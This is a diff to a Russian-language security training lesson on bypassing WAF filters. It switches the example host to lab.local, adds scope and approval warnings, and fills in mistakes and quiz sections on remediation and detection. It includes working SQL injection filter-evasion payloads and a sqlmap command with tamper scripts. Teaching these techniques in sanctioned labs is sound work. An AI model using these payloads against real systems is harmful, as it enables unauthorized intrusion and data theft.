@@ -23,7 +23,7 @@
 **Что нельзя переносить на Slider AI без отдельного разрешения:** не переносить exploitation, privesc, bypass и aggressive enumeration на Slider AI без расширенного scope.
 
 
-**Процессный артефакт:** `VULNERABILITY_TRIAGE.md`: lab-to-product transfer matrix и ограничения scope.
+**Процессный артефакт:** встроенный шаблон vulnerability triage из пользовательской инструкции: lab-to-product transfer matrix и ограничения scope.
 
 **Безопасная цель:** TryHackMe, Hack The Box, PortSwigger Academy и другие платформы только в рамках их правил и активной учебной машины.
 
@@ -183,27 +183,27 @@ Kali ARM64 VM используется как углубление, когда �
 
 **Тестовый запрос (блокируется):**
 ```
-http://target.com/page.php?id=1 UNION SELECT 1,2,3
+http://lab.local/page.php?id=1 UNION SELECT 1,2,3
 ```
 
 **Метод 1: Вставка комментариев**
 ```
-http://target.com/page.php?id=1 UN/**/ION SE/**/LECT 1,2,3
+http://lab.local/page.php?id=1 UN/**/ION SE/**/LECT 1,2,3
 ```
 
 **Метод 2: Inline комментарии MySQL**
 ```
-http://target.com/page.php?id=1/*!UNION*//*!SELECT*/1,2,3
+http://lab.local/page.php?id=1/*!UNION*//*!SELECT*/1,2,3
 ```
 
 **Метод 3: Кодирование**
 ```
-http://target.com/page.php?id=1+%55%4e%49%4f%4e+%53%45%4c%45%43%54+1,2,3
+http://lab.local/page.php?id=1+%55%4e%49%4f%4e+%53%45%4c%45%43%54+1,2,3
 ```
 
 **Метод 4: Через NULL и приведение типов**
 ```
-http://target.com/page.php?id=1+UNION+ALL+SELECT+NULL,NULL,NULL
+http://lab.local/page.php?id=1+UNION+ALL+SELECT+NULL,NULL,NULL
 ```
 
 ### Обход XSS-фильтров
@@ -238,7 +238,7 @@ http://target.com/page.php?id=1+UNION+ALL+SELECT+NULL,NULL,NULL
 **SQLMap с обходом WAF:**
 ```bash
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
-sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,charencode --batch
+sqlmap -u "http://lab.local/page.php?id=1" --tamper=space2comment,charencode --batch
 ```
 
 **Tamper-скрипты в sqlmap:**
@@ -279,26 +279,18 @@ Sanitization: secrets and personal data excluded
 
 ## Частые ошибки
 
-1. **Ошибка 1**: Типичная ошибка новичков в этом уроке.
-2. **Ошибка 2**: Еще одна распространенная проблема.
-3. **Ошибка 3**: Важный момент, который часто упускают.
+1. **Перенос bypass payload на продукт** — WAF bypass и tamper payloads выполняются только в lab/PortSwigger или после written approval.
+2. **Считать обход WAF исправлением уязвимости** — WAF снижает риск, но корневой дефект исправляется в приложении.
+3. **Игнорировать логи и detection** — для Security QA важны не только payload/response, но и то, появились ли сигналы мониторинга.
 
 ## Вопросы на понимание
 
-1. Вопрос 1 на понимание материала?
-   <details><summary>Ответ</summary>Ответ на вопрос 1</details>
-2. Вопрос 2 на понимание материала?
-   <details><summary>Ответ</summary>Ответ на вопрос 2</details>
-3. Вопрос 3 на понимание материала?
-   <details><summary>Ответ</summary>Ответ на вопрос 3</details>
-
-## Форматы флагов
-
-- **TryHackMe**: `THM{...}`
-- **HackTheBox**: `HTB{...}`
-- **PortSwigger**: "Lab solved!" (без флагов)
-
-
+1. Почему WAF bypass не доказывает наличие SQLi сам по себе?
+   <details><summary>Ответ</summary>Bypass показывает поведение фильтра. Finding требует подтверждения уязвимости приложения, влияния и воспроизводимости в разрешенной среде.</details>
+2. Какие действия по WAF можно безопасно выполнить на olddev?
+   <details><summary>Ответ</summary>Только пассивное наблюдение заголовков/ошибок и оформление approval request; payload mechanics остаются lab-only.</details>
+3. Что должно быть в remediation для WAF-related finding?
+   <details><summary>Ответ</summary>Исправление в коде, server-side validation, logging/detection и retest без разрушительных payloads.</details>
 
 ## Адаптация под macOS (M2, 8GB)
 
